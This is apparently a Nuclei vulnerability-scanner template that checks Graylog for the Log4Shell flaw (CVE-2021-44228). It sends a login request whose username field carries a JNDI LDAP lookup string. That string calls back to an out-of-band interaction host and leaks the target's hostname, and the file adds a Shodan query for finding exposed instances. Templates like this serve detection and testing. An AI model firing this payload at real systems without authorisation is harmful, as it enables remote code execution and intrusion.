http:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 2
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: header
    type: word
    words:
    - 'X-Graylog-Node-Id:'
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'POST /api/system/sessions HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json

    X-Requested-With: XMLHttpRequest

    X-Requested-By: XMLHttpRequest

    Content-Type: application/json

    Origin: {{BaseURL}}

    Referer: {{BaseURL}}


    {"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}","password":"admin","host":"{{Hostname}}"}

    '
id: graylog-log4j-rce
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:graylog:graylog:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-44228
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: Graylog is susceptible to remote code execution via the Apache Log4j
    2 library prior to 2.15.0 by recording its own log information, specifically with
    specially crafted values sent as user input. Apache Log4j2 2.0-beta9 through 2.15.0
    (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in
    configuration, log messages, and parameters do not protect against attacker-controlled
    LDAP and other JNDI-related endpoints. An attacker who can control log messages
    or log message parameters can execute arbitrary code loaded from LDAP servers
    when message lookup substitution is enabled.
  metadata:
    max-request: 1
    product: graylog
    shodan-query: title:"Graylog Web Interface"
    vendor: graylog
    verified: true
  name: Graylog (Log4j) - Remote Code Execution
  reference:
  - https://www.graylog.org/post/graylog-update-for-log4j
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  severity: critical
  tags: cve,cve2021,rce,jndi,log4j,graylog,kev,oast,vuln
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'
